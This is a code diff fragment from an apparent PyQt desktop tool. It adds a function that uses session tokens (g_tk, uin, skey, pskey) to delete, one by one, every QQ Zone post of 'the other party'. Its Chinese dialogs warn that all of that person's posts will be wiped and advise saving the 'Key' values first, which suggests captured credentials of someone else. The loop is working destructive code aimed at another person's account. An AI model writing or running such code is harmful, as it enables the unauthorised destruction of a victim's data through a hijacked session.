+    def delete_all_emotions(self,g_tk,uin,pskey,skey):
+        reply = QtWidgets.QMessageBox.question(self, '警告', '此操作将清空对方**所有**说说,你要继续吗?',
+                                     QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No, QtWidgets.QMessageBox.No)
+        if reply == QtWidgets.QMessageBox.Yes:
+            reply_2 = QtWidgets.QMessageBox.question(self, '警告', '此操作将耗时部分时间,若对方说说量较多甚至可能需要1天到不等的时间,建议提前保存Key值码,你要继续吗?\n若只要删除小数量的说说,强烈建议使用删除说说!',
+                                                   QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No,
+                                                   QtWidgets.QMessageBox.No)
+            if reply_2 == QtWidgets.QMessageBox.No:
+                return
+        else:
+            return
+        QtWidgets.QMessageBox.information(self,"提示","接下来程序可能会未响应,属于正常情况,请耐心等待\n若想判断是否正常工作,可检查对方说说是否在逐条删除")
+        pos = 0
+        while True:
+            emotion = self.get_emotion_list(g_tk=g_tk,uin=uin,skey=skey,pskey=pskey,
+                                            num=1,pos=pos,return_content=True)
+            if not emotion:
+                break
+            print(f"deleting {emotion[0][1]}...")
+            self.delete_emotion(g_tk=g_tk,uin=uin,skey=skey,pskey=pskey,no_log=True,tid=emotion[0][1])
+        QtWidgets.QMessageBox.information(self,"提示","删除完成")
+
 
 if __name__ == '__main__':
     #获取UIC窗口操作权限
